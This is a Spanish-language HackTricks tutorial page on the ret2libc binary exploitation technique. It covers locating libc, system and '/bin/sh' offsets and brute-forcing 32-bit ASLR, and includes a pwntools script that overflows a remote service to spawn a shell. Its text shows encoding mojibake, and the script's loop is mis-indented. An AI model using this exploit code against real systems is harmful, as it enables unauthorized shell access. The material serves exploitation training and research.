# Ret2lib

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informaci贸n B谩sica**

La esencia de **Ret2Libc** es redirigir el flujo de ejecuci贸n de un programa vulnerable a una funci贸n dentro de una biblioteca compartida (por ejemplo, **system**, **execve**, **strcpy**) en lugar de ejecutar shellcode suministrado por el atacante en la pila. El atacante crea un payload que modifica la direcci贸n de retorno en la pila para apuntar a la funci贸n de la biblioteca deseada, al mismo tiempo que organiza que los argumentos necesarios se configuren correctamente seg煤n la convenci贸n de llamada.

### **Pasos de Ejemplo (simplificados)**

* Obtener la direcci贸n de la funci贸n a llamar (por ejemplo, system) y el comando a llamar (por ejemplo, /bin/sh)
* Generar una cadena ROP para pasar el primer argumento apuntando a la cadena de comando y el flujo de ejecuci贸n a la funci贸n

## Encontrar las direcciones

* Suponiendo que la `libc` utilizada es la de la m谩quina actual, puedes encontrar d贸nde se cargar谩 en memoria con:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Si deseas verificar si ASLR est谩 cambiando la direcci贸n de libc, puedes hacer lo siguiente:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Saber la libc utilizada tambi茅n es posible encontrar el desplazamiento a la funci贸n `system` con:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Saber la libc utilizada tambi茅n es posible encontrar el desplazamiento a la funci贸n de la cadena `/bin/sh` con:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Conociendo la libc utilizada, tambi茅n es posible usar Peda o GEF para obtener la direcci贸n de la funci贸n **system**, de la funci贸n **exit** y de la cadena **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Si el proceso est谩 creando **hijos** cada vez que interact煤as con 茅l (servidor de red), intenta **leer** ese archivo (probablemente necesitar谩s ser root).

Aqu铆 puedes encontrar **exactamente d贸nde se carga la libc** dentro del proceso y **d贸nde se cargar谩** para cada hijo del proceso.

![](<../../../../.gitbook/assets/image (95).png>)

En este caso se carga en **0xb75dc000** (Esta ser谩 la direcci贸n base de la libc)

## Librer铆a libc desconocida

Podr铆a ser posible que **no sepas qu茅 libc est谩 cargando** el binario (porque podr铆a estar ubicado en un servidor al que no tienes acceso). En ese caso podr铆as abusar de la vulnerabilidad para **filtrar algunas direcciones y encontrar qu茅 librer铆a libc** se est谩 utilizando:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Y puedes encontrar una plantilla de pwntools para esto en:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Saltando ASLR en 32 bits

Estos ataques de fuerza bruta son **solo 煤tiles para sistemas de 32 bits**.

* Si el exploit es local, puedes intentar forzar la direcci贸n base de la libc (煤til para sistemas de 32 bits):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Si est谩s atacando un servidor remoto, podr铆as intentar **hacer fuerza bruta en la direcci贸n de la funci贸n `usleep` de `libc`**, pasando como argumento 10 (por ejemplo). Si en alg煤n momento el **servidor tarda 10 segundos adicionales en responder**, encontraste la direcci贸n de esta funci贸n.

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## Ejemplo de C贸digo x86 Ret2lib

En este ejemplo, la fuerza bruta de ASLR est谩 integrada en el c贸digo y el binario vulnerable est谩 ubicado en un servidor remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## Ejemplo de C贸digo x64 Ret2lib

Ver el ejemplo en:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (o puts)

Esto permite **filtrar informaci贸n del proceso** llamando a `printf`/`puts` con datos espec铆ficos colocados como argumento.

## Ret2printf

B谩sicamente significa abusar de un **Ret2lib para transformarlo en una vulnerabilidad de cadenas de formato de `printf`** utilizando el `ret2lib` para llamar a printf con los valores para explotarlo (suena in煤til pero es posible):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
